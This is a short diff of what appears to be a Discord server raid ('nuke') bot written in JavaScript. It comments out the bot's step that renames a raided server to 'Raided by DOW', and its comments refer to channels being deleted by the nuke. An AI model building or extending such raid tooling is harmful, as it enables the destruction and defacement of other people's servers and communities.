@@ -6,7 +6,7 @@ const fs = require("fs")
 // Settings for the bot.
 const settings = {
     botToken: "YOUR TOKEN HERE",
-    guildName: "Raided by DOW"
+    //guildName: "Raided by DOW" (BROKEN AT THE MOMENT)
 };
 
 //on ready:
@@ -14,8 +14,8 @@ client.on("ready", () => {
 
     //startup message 
     console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
-    // Set the guild name 
-    guild.setName(settings.guildName);
+    // Set the guild name (BROKEN)
+    //guild.setName(settings.guildName);
     // create variable for new channel to prevent it from getting deleted by nuke
     let createdChannelName;
     // Create an invite to a channel
